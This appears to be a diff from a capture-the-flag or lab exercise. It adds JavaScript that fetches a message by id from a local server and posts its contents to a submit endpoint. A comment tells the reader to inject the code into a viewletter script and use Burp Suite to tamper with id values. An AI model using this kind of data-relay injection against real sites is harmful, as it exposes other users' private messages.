@@ -1,0 +1,14 @@
+  fetch("http://127.0.0.1/message/3").then((r) => {
+    return r.text();
+  }).then((x) => {
+    fetch("http://127.0.0.1/submit", {
+      "headers": {
+        "content-type": "application/json"
+      },
+      "body": x,
+      "method": "POST",
+    });
+  });
+
+
+//add this code in static/viewletter.js on your locahost using burp suite as an intercepter to intercept the traffic given and mess around with the id=## 
